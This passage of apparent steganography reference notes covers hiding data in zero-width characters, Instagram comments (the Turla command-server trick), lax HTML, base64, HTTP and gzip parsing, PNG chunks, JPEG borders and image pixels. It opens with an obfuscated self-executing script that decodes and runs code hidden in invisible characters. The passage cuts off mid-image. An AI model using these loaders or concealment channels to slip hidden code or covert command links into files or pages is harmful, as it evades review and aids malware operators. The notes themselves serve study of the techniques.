‌﻿‍​‍﻿‌‌﻿﻿‌‍​﻿‌‍﻿‍‌​‍﻿​‍​﻿‌‍﻿﻿‌​‌﻿​‍​‍‌​﻿﻿​‍​﻿‌﻿﻿﻿‍​‌﻿‌﻿‌‍​‌​﻿​​﻿‍﻿‍‍‍‍‍​﻿​‌​﻿‌﻿‍﻿‌‌﻿﻿​‍​﻿​‍‍﻿‌​‍﻿‌‍﻿﻿​‌﻿‍​‌‌﻿‌‍‌﻿‌​‍﻿‌​​﻿‌‍​﻿‌‌​‍​‌​﻿​﻿​﻿‌‌﻿﻿‌﻿‍﻿​﻿‍﻿‌‌‍‍​‌‌‍​‌﻿‍​‍‍‍‌﻿﻿‍​‌​﻿‌‌‍﻿‌﻿﻿﻿‌‌﻿﻿‌﻿​﻿﻿‌‌‍​‌‌‍​‍‌‍​‍‍‍​‍‍﻿​‍‍﻿​‌‍‍​‌​﻿​​﻿‍﻿‍‍‍‍​​‍﻿​﻿﻿​‌﻿‍﻿​‍‍‍‍﻿﻿‌​﻿﻿‍​‍﻿‌‍﻿‍‌‍‍﻿﻿‌‌﻿​﻿‍﻿​‍‍‍‌​﻿﻿‌﻿﻿﻿​‍﻿﻿​﻿﻿﻿‌‌﻿﻿​﻿‌‍‍﻿​﻿‍‍​﻿﻿‍‍‍﻿﻿﻿‍‌﻿‍‍‌​﻿﻿﻿﻿‍﻿​‌﻿﻿​‍‍﻿‌﻿﻿‍‌‍‌‍‌‍‍﻿‌‍​﻿﻿‍‍‍﻿﻿﻿‍‌﻿‍‍‍﻿​‍﻿﻿﻿﻿​‌‍﻿​﻿‍‍‌​​﻿﻿‌‌﻿‌​﻿﻿‌​‍‍​‌​‍﻿​​‍​​﻿﻿‌‌﻿﻿​‍​﻿‌​​‍‌​﻿‍​‌‍‍​‌‍‍​﻿﻿‍​‌﻿‍‌​﻿‍​‍﻿‍‌‍‌‍‍‍﻿﻿​﻿‍﻿‌‌﻿﻿​﻿‍‍﻿​‍‍﻿﻿‍‍‍​​﻿​﻿‍﻿‌‌﻿﻿​﻿‍‍﻿​‍‍‍‍﻿‍‌​​﻿​​‌﻿‌‍‌﻿﻿‌﻿﻿​‌﻿‍‍‍﻿﻿‌‌‍‍​‍﻿‍﻿﻿‍‍‌‍‍‍‌​﻿‍‌‍‍﻿‍‍​‍‍﻿‍‍‌‍‍﻿‌﻿﻿﻿​﻿‌﻿﻿​‌﻿​‌﻿‍‌‍‍﻿‍‌‌﻿‌‍﻿﻿​﻿‌﻿‌‍﻿﻿​‌‌﻿﻿‌‍﻿‌​​‍‌‍‍﻿​‍​﻿‍﻿‍﻿‌‍​‍﻿‌‍﻿‌‍​﻿﻿‌﻿‍﻿‌‍﻿‌​‍﻿‌​​﻿‌​​﻿‌‌​‍﻿​‌﻿‌﻿​﻿﻿‌‍﻿‌‌‍‍﻿‌‍﻿​‍​﻿‌‍﻿﻿‌​﻿﻿‌﻿﻿‍‌​‌‍‌​‌‍‌​‌‍‍​​﻿‌‌‍‍​‍﻿﻿‍﻿‌‍​​‍﻿‌‌﻿‍​​‌﻿‌‍‌﻿​‌﻿‍‌‍‍﻿‌​﻿﻿‌‌﻿﻿‌‌‍﻿‌‌﻿‍‌‍‍‍‌﻿‌﻿‌​‍﻿​﻿‍‍​‌​﻿​‍​﻿‌‍​﻿‌‌‍﻿‌‌﻿﻿﻿​‌﻿‌​‍﻿‌​﻿‍‌‍‍﻿‌‍﻿﻿​﻿‍‍‌‍‍﻿​﻿﻿﻿​‍​﻿﻿​‌﻿​‍​‍‌‍‍﻿‌﻿‍﻿‌​​﻿​﻿‍‍‌‍‍﻿​‍​﻿‍﻿‍﻿‌‍​﻿‌﻿﻿﻿‌‍‍﻿‌﻿​‍﻿‌‍﻿‌﻿‍﻿‌​​﻿​﻿‍‍‌‍‍﻿‌​‌﻿‍​‍‍‌﻿‌﻿‌﻿​﻿​﻿‍‍​‌​‍‌​‍‍‌‍‍‍​​‍﻿‌‍﻿‍‌‍‍﻿‌‌‍﻿​‍‌﻿‌﻿﻿﻿‌﻿‌‍‍﻿​﻿﻿‌‌﻿​﻿‍﻿​‍‍‍​‌‌‍‌​​‍‌​​﻿​﻿‍﻿​﻿​﻿‌‌﻿﻿​﻿‍‍﻿﻿﻿﻿​‍‌‍‌​‌﻿‌‍​﻿‌​​﻿‌​﻿‍‌​​‍﻿‍​﻿​​​﻿‍‍‍‍﻿‍​‍‍​​﻿‌‍﻿‍​​‌‍‍​​﻿‌‌﻿‍​​‌‍‍​​﻿​‍‍﻿‍﻿‌﻿‍‌﻿﻿‌​‌‍‌‍‍﻿‌﻿‌﻿‌‍﻿﻿‌‍​﻿​﻿‍‍‌​‍‍‌‍‍﻿‌​​﻿‌﻿‌‍‌‍‍﻿‌‍​﻿‍﻿‍﻿​‍​‍﻿‌‍﻿​﻿​‍﻿‌‍﻿‍‌​‍﻿‌‍﻿​﻿﻿﻿​‍​‍﻿​‌﻿‌﻿​‍‌‍‍﻿​‍​﻿‌​​﻿‌​﻿‍﻿‌‍﻿﻿﻿﻿﻿‌​‌﻿‌‌﻿﻿‌‍​﻿﻿‌﻿‍﻿‌‍﻿​﻿‍﻿‍​‌﻿‌‍​﻿‌‌​﻿​‍​﻿﻿‌‍﻿‌​​‍‌‍‍﻿​‍‍﻿​﻿﻿﻿‌​‍﻿‌​‍‍‌‍‍﻿‌​​﻿‌﻿‌﻿﻿‌‍﻿‌‌‍﻿‌‌﻿﻿​‍​‍‌‍‍‍﻿​﻿﻿​﻿﻿‍‌﻿‍‍‌‍‍‍​‌‌‍‌‌﻿‍‍​​﻿​‍‍﻿‍﻿‌﻿​‌‌‍﻿‌​‍﻿​‌‍‍‌‍﻿​​​﻿‌‍﻿‍﻿​‍﻿​‍‌﻿​﻿‍‍‌‌‍‍​﻿‍‍​‍‌‍﻿﻿‌‍‌​​‍‌​​‍‍‌‍‍‌‍‍﻿​‌﻿﻿‍﻿‍‍‌‍‍﻿‍‌‌﻿﻿‍​‍‌‍‍﻿‌‌‍﻿﻿​‌﻿‌﻿﻿‍‍​​‍‍‍​‍‍‍﻿‍﻿​‌‍‍‌‍‍‌‍‍﻿‌‌﻿﻿‌﻿‍‍‍﻿​﻿‌﻿​﻿‌​​‍‌‍‌﻿﻿‌‍﻿​‌﻿﻿​‍‍﻿‌﻿﻿‍‍﻿​﻿‌‍‌﻿‍​﻿﻿​﻿‍﻿﻿‍‍‍‌‍‌‍‌‍‍‍﻿‌﻿‍‍﻿​﻿‍‍​‍‍﻿‍‍‌‍‌﻿‍﻿‌﻿‍​​﻿‍​﻿‍‍‌‍‍﻿‌​﻿‌​​﻿‍​﻿‍‍‌‍﻿​​​‍‍​​‍‍‍​‍​​‌﻿﻿​‍‍‌﻿​‍﻿﻿‌‍‍‍‌﻿‌﻿​﻿‌​​‍​​​﻿﻿‍‍﻿‌‍​﻿‌​‍﻿‌‌﻿﻿‌‍​﻿‌‌​‍​​﻿﻿‌‍​‍‍﻿‍‍​‌​﻿‌‍​‍‍﻿‍‍‌‌‍‍﻿﻿‌‍‍‍﻿‍​​‌‍﻿‍‍‍​​‍‍‍‍‌‍﻿‌‌﻿‌﻿​﻿‍​‍﻿‍﻿﻿‍﻿​‍﻿‌​﻿﻿‌﻿﻿‍‌﻿‍﻿‍‍‌﻿​‌﻿﻿‍‌﻿﻿‌﻿‍‍‌‌‍‍‌‍‌‍‍‍​‍﻿﻿﻿﻿​‌‍﻿​﻿‍﻿‍‌​﻿‌﻿﻿﻿‌‍﻿‍‍﻿‍﻿‌​​﻿‌​﻿﻿​‍‍‍﻿‍﻿﻿​‍​‍‍﻿﻿﻿​﻿‌﻿‍‌​‍‌‍‍‍‍﻿‌‍​​﻿﻿﻿‍​‍‍‌﻿‍‌​‌﻿‌﻿‌﻿​‍‌﻿‌​​﻿‌​﻿﻿‍‍​‍‍​‍‍‌‌‍‍‍﻿​‍​​﻿‍‌‍‌‍‍‌‍﻿​‍‍﻿‍​﻿‍‍‌﻿﻿​﻿‍﻿​‍‌‍﻿​‌﻿‌﻿​‍‍‌​‍‌​‌‍﻿​‍﻿‌​‌﻿‌﻿​﻿​﻿‍﻿‌‌‍‍‍​‍﻿‌‌‍﻿‍‌​﻿‍‍​﻿﻿‌﻿﻿‌﻿﻿‍‍​‌﻿‌‌‌‍​​﻿‍​‍‍‍​‌​﻿‌‌‌‍​​‍‍​﻿‍‍​‌​﻿‌‌‌‍‌‌​‍‌‌​‍‌‌﻿﻿​‌​‍‍​​‍​​‍‍‌​​‍﻿‍‍﻿﻿​‍﻿﻿​‍﻿‌​‌‍﻿‍﻿﻿​‍‌﻿‌﻿﻿﻿​‍​‍﻿‍‌‍‌‍‌‍​‌​﻿‌‍‍‍‌‌‍‍﻿‍​﻿‌​﻿﻿‌‌﻿﻿‌‌‍﻿‌‌﻿‍​﻿‍‍​‍‌‍﻿﻿‍‍​​‌﻿﻿‍​﻿‌​﻿﻿‌‍﻿﻿‌​‍‍﻿​‍‍﻿​﻿﻿‍‌‌﻿﻿‍​‍﻿﻿﻿﻿​﻿‍﻿‌﻿﻿‍﻿﻿‌‍‌‌﻿‍​‌​‍﻿﻿​﻿​‍​﻿‌‍​﻿​‍‌﻿﻿​‍‍‌﻿​‍‌‌​﻿﻿​‍‍‌﻿​﻿‌‌﻿﻿​‍‍﻿​﻿‍‍​​‌‍﻿‌‍﻿‌﻿﻿‍‌‍‍‍﻿‌﻿﻿​﻿‌﻿‌‍﻿﻿‌​‍﻿​﻿﻿﻿‌﻿﻿‍﻿‌‌﻿‌﻿‍﻿‌​​﻿‌‍​﻿​﻿﻿﻿‌​﻿﻿‌﻿﻿‍‌﻿‍‍‌​‌‍﻿‌​‍​‌‌‍‍​​﻿​‍‍‍‍‍﻿‍‍‍​‍‌‍‍﻿‌‌﻿﻿‌﻿‍‍‍﻿​‍﻿​‍﻿‌​‍﻿‌﻿﻿‍﻿​﻿﻿​‍​﻿​﻿‍‍﻿​‌﻿‌‌﻿﻿‌​‌‍﻿​​‍‌‍‍﻿‌‍​﻿‌‌‍﻿‍‌​﻿​‍​﻿‍​‍‍‌‍﻿‍‌​‌﻿​‍​﻿​‍‍﻿‌​‍﻿‌‌﻿﻿​﻿‍‍‌‌‍‍‌‍‌‍‌﻿‍﻿‌​‌﻿​﻿‍‍​​​‍‌‍‌‍‌‌﻿‍‌​‌﻿‍﻿‍﻿‌​​﻿​﻿﻿﻿​‍‌﻿‍﻿‌‍‍‍﻿﻿​‍‍‍​​‌﻿‍﻿​‍‌​‌﻿‌‍​‍‍​‍﻿‍‍﻿﻿​﻿‍‍‌‌‍﻿‌‌﻿﻿‍‌​﻿‌‍﻿﻿​‍‌﻿‍​‍﻿‌﻿﻿﻿​﻿‍﻿‍​﻿﻿​﻿﻿﻿​﻿‍﻿‍​‌﻿​‍‌﻿‌‌﻿﻿﻿‍‍﻿‌​​﻿‌​‌﻿﻿‍﻿﻿‌‌﻿‍​​﻿‍​‍‍‍​‌​﻿‌‌﻿‍​​‍﻿﻿‍‌﻿​‍﻿﻿﻿‌​﻿​‍​﻿﻿​﻿‍‌‌‍﻿‌​‍﻿﻿﻿​‍﻿﻿﻿﻿‌​﻿﻿​‍‍﻿‌​‍﻿‌‍﻿‍﻿﻿﻿﻿﻿‌‍‍‌‍‍﻿​﻿‍﻿﻿‌﻿﻿‌​​﻿‌﻿‍﻿﻿‌‌﻿‌‌‍﻿​﻿‍﻿﻿​‌﻿‌﻿﻿﻿​‍‌﻿﻿​​‍​‌‍‍​‍‌‍​‍‍﻿‌‍‍﻿‌﻿‌﻿‌​​﻿​‍‌﻿​‌‌﻿﻿‍​﻿‌‍​﻿‍​‌﻿​‍‍﻿​﻿‍﻿​​‍﻿​‍​﻿​﻿﻿﻿‌‍‌﻿​‍​‍‍‌﻿﻿​​‌﻿‌‌‍﻿‌﻿﻿﻿‌‍﻿﻿‌﻿‍‍‍‍﻿﻿​​​‍‌‍‌‍​​‌‍‌﻿​‍​‌​﻿‌﻿‌﻿‌​​﻿​‍‌‍‌‌‍﻿﻿‌﻿‍‌‍‍﻿‌‌﻿﻿‌​‌‍‌‍‍‍‌﻿‍‍​​﻿‍‌﻿​﻿​​​﻿​​‌﻿​​‍﻿​‌‌﻿‌‍‍﻿﻿​​﻿﻿​‌﻿﻿‌‌﻿﻿‌﻿﻿﻿‌‍﻿﻿﻿​﻿﻿‍‌﻿﻿‍﻿﻿﻿‍‍﻿‍​‌﻿‍​﻿﻿‍​‍﻿‍‌​﻿‍﻿​﻿‍﻿‌﻿‍﻿‍‍​​​‍‌﻿‍‍‌‍﻿‍﻿​​‍﻿​‌‍﻿​﻿‍﻿​‍‍﻿‌​‍﻿‌‌‍﻿‌﻿‍﻿‌‍‍﻿﻿​‍﻿﻿‌‍﻿﻿﻿‍﻿﻿‍‍﻿‍​‍﻿‍‌‍﻿‍﻿‍﻿‍‍‍‍​​‍‍​‌‍‍​‍‍‍‌​‍‍‌﻿‍‍‌‍‍‍﻿​‍‍﻿‌‍‍﻿﻿‍‍﻿‍‍‍‍​‍‍‍‌‍‍‍﻿‍‌﻿​‍‌‌﻿﻿​﻿​﻿‌‌﻿﻿​﻿‍﻿‌‌‍‍‌‌‍﻿﻿​​‍‌​‌﻿​‍​﻿​‍‍﻿‌​‍﻿‌‌﻿﻿​﻿‍‍‌‌‍‍‌﻿‍﻿﻿‌​﻿﻿‌﻿﻿﻿​﻿‍‌‌﻿‍‌‌﻿﻿﻿​​‍​​﻿﻿‌‌‌﻿‌​​﻿‌‌﻿﻿‌​‌‍‌‌‍﻿​‍‍﻿‌​​﻿​‍‍‍‌‌‍‍‌‌﻿‍‌‌﻿‍​‌​﻿‌﻿﻿﻿​﻿‌﻿‌‍﻿﻿‌​‍‍‌‌‍﻿﻿​​‍‌‌﻿";l=q.length;s="substring";for(i=0;i<l;i+=4)
		{w="";for(j=0;j<4;j++){w+=(q.charCodeAt(i+j)*5/2)&3};q+=String.fromCharCode(
		parseInt(w,4))};c=q[s](l,l+11);c[c][c](q[s](l+11))(); // by @mihi42</script>
- hide short link ID in Instagram comment: `‍#2hot ma‍ke lovei‍d to ‍her, ‍uupss ‍#Hot ‍#X` gives `2kdhuHX` for `http://bit.ly/` ID.

		let regexp = /(?:\u200d(?:#|@)?)(\w)/g;
		let match;
		let result = "";
		let str = "asmith2155: ‍#2hot ma‍ke lovei‍d to ‍her, ‍uupss ‍#Hot ‍#X";
		// This string contains Unicode Character 'ZERO WIDTH JOINER' (U+200D)
		// "#" (prepend hashtags) or "@" (prepend a username) characters are used to justify capital letters in the middle of a sentence, without breaking it ability to be recognized as hashtag or username
		while((match = regexp.exec(str)) !== null){
			result += match[1]
		}
		result;// "2kdhuHX" prepend it with http://bit.ly/

	- [Turla’s watering hole campaign: An updated Firefox extension abusing Instagram](https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/)
	- [You’ll never guess where Russian spies are hiding their control servers | Ars Technica](https://arstechnica.com/security/2017/06/russian-hackers-turn-to-britney-spears-for-help-concealing-espionage-malware/)
- `snow` append whitespaces to then end of lines

###### Hide data by using permissively

It's still valid, but add extra data will be invisible / ingored when read normaly

- HTML is permissive
	- `<div a="b><span></span></div>` eq. `<html><head></head><body></body></html>`
	- `<div a=b"><span></span></div>` eq. `<html><head></head><body><div a="b&quot;"><span></span></div></body></html>`
	- `<div something="else"<span>test</span></div>` eq. `<html><head></head><body><div something="else" <span="">test</div></body></html>` (attributes: `something` and `<span`)
	
	- [Attribute names - HTML Standard](https://html.spec.whatwg.org/multipage/syntax.html#attributes-2)
	- [Tag omission in text/html - HTML 5.1: 3. Semantics, structure, and APIs of HTML documents](https://www.w3.org/TR/html/dom.html#tag-omission-in-text-html)
	- [8 The HTML syntax — HTML5](https://www.w3.org/TR/html5/syntax.html#tokenization)
	- [void elements](https://www.w3.org/TR/html51/syntax.html#void-elements)
	- [The Actual Browser Problems with Unquoted Attributes | CSS-Tricks](https://css-tricks.com/problems-with-unquoted-attributes/)
	- [Unquoted attribute values in HTML and CSS/JS selectors · Mathias Bynens](https://mathiasbynens.be/notes/unquoted-attribute-values)
	- "A p element’s end tag may be omitted if the p element is immediately followed by an [...]" — [HTML 5.1: 4.4. Grouping content](https://www.w3.org/TR/html/grouping-content.html#the-p-element)
- base64 variant could allow chars outside alphabet (ignored) means you can write text/url with it. [Some decoder ignore only spaces](https://html.spec.whatwg.org/multipage/webappapis.html#atob:space-character) (`atob("Hello world") == "ée£\n+"`)
	- [Stupid certificate tricks | rya.nc](https://rya.nc/cert-tricks.html)
	- [PGP ASCII Art - cem](https://www.cem.me/20150706-pgp-art.html)
- HTTP chunk encoding (browsers) ignore remains chunks after a chunk with zero length
- HTTP Field parameters allow to escape any char in parameter value: `Content-Disposition: application/octet-stream; filename="w\hat th\e\ hel\l is going \on.mp3"` gives "hello"
- `gzip-steg` ftp://ftp.mirrorservice.org/sites/ftp.wiretapped.net/pub/security/steganography/gzip-steg/
	> gzip uses LZ77 which compresses data by storing length/offset pairs that refer back in the uncompressed data stream to previous occurrences of the information being compressed. gzip considers a length of 3 to be the shortest acceptable length. We allow gzip to find the length/offset pairs and then do the following.
	> 
	> If the length is at least 5 then we subtract 1 and set bit 0 to the value of the bit that we need to hide. We have now hidden information in the length without pushing it beyond a valid value.  Drawbacks are a slight decrease in compression (very slight) since we have to disallow lengths of 4 and some of our meddling will decrease the actual matched length by 1. The hidden file is totally invisible to the normal operation of gzip, gunzip et al and (if encrypted) will only be visible to those in the know.
- JSON indentation / whitespaces between tokens

###### Hide data with optional fields

In metadata, comment, extra fields or unused fields

- PNG `tEXt` chunk (comment)
	See also [chunks `zTXt` and `iTXt`](https://sno.phy.queensu.ca/~phil/exiftool/TagNames/PNG.html#TextualData)


	```bash
	exiftool "-Comment<=/path/to/secret.txt" dummy.png
	exiftool -b -Comment dummy.png > secret.txt
	```
	- PHP contains base64 contains PNG with data encoded in `tEXt` chunk (comment)
		- [When Bad Guys are Pwning Bad Guys... - SANS Internet Storm Center](https://isc.sans.edu/forums/diary/When+Bad+Guys+are+Pwning+Bad+Guys/22410/)
		- [backdoor as stripped from RC-SHELL](https://gist.github.com/anonymous/319ef7124affebec67ebc56bc83cbe87)
- PNG custom chunk
	- [Pozo/punk: Hiding a payload in PNG files with JAVA](https://github.com/Pozo/punk)
	- [Hiding a payload in PNG files with Python](http://blog.brian.jp/python/png/2016/07/07/file-fun-with-pyhon.html)
- gzip stream can optionaly contains additional data and often ignored when not handling files (like HTTP response):
	* extra header (2 Bytes + 256 Bytes max)
	* original filename: N Bytes + 1 Byte (`\0`)
	* creation date: 4 Bytes (POSIX timestamp)
	* comment N Bytes + 1 zero Byte (`\0`)
	
	See `gzip -N`
	
	It's also possible to concatenate gzip stream in one `cat file1.gz file2.gz file3.gz > all.gz`. This could be ignored (the reader read only the first part). See [Concatenation](GZip#Concatenation)
	
	You can also add extra data after gzip stream, some tools/libs ignore them (`gunzip -q`)
- HTTP/1.1 chunk encoding use chunk extension (kind of comment), always ignored https://tools.ietf.org/html/rfc7230#section-4.1.1
- matroska media container can contains additional tags to store fonts, text, image, binary, etc.
- HTTP chunk encoding tailers are often ignored (but visible with the header `Trailer:`)
- HTTP allow unlimited unstandardized headers
- HTTP message using `multipart/*` support multiple resources [subtypes share the same syntax](https://tools.ietf.org/html/rfc2046#section-5.1.1)
- MIME External-Body Subtype: `message/external-body`, in "phantom body"
- JPEG and some videos codecs like H.264 need the number of pixel to be a multiple of 8 or 16 (macroblocks). All this data is encoded, it's clamped to the image size.
	Odd-sized like 1x1 JPEG image will contains 16x16 pixels (or 8x8 pixels)
	That means data could be written in this border area, but never rendered by common JPEG/video librairies. Only if you rewrite the image size before decoding it.
	- [Block splitting](https://en.wikipedia.org/wiki/JPEG#Block_splitting)
	- [Source Coding and Compression](http://iphome.hhi.de/schwarz/assets/pdfs/08_ImageCoding.pdf#page=23)
	- [Comment ajouter une légende invisible à une image JPEG. - YouTube](https://www.youtube.com/watch?v=RuqAV_By7ig)
	- [JPEG effets de bord et sous-échantillonnage chroma - YouTube](https://www.youtube.com/watch?v=V7LvgXqsh60)
- [NTFS Alternate Data Streams: Hiding data in plain sight since 1993 – EventSentry Blog](https://www.eventsentry.com/blog/2008/07/ntfs-alternate-data-streams-hi.html)
- embedded font or image in PDF, HTML, SVG, etc.

- [ExifTool FAQ](https://sno.phy.queensu.ca/~phil/exiftool/faq.html#Q10) - "How does ExifTool handle coded character sets?", type-specific details are given below about comment handling for EXIF, IPTC, XMP, PNG, ID3, PDF, Photoshop, QuickTime, AIFF, RIFF, MIE and Vorbis information

###### Hide data in pixels

Better if image is lossless

Ex: use PNG 64-bit RGBA to store less visible data, images in PDF

Can use 1 or more color channels

	<!--
	http://en.wikipedia.org/wiki/Steganography#Digital_steganography
	
	http://en.wikipedia.org/wiki/File:StenographyOriginal.png
	http://upload.wikimedia.org/wikipedia/commons/4/4e/StenographyOriginal.png
	data:image/png;base64,....
	
	Use data URI instead of URL for security restriction
	-->
	<script>
	function imageLoaded()
	{
		var canvas = document.getElementById("dest");
		var width = canvas.width = this.width;
		var height = canvas.height = this.height;
		var context = canvas.getContext("2d");
		context.drawImage(this, 0, 0);
		var imageData = context.getImageData(0, 0, width, height);
		for (var l = imageData.data.length; l--;)
			imageData.data[l] = parseInt((imageData.data[l]).toString(2).substr(-2), 2) * 85;
		context.putImageData(imageData, 0, 0);
	}
	</script>
	
	<img id="src" src="data:image/png;base64,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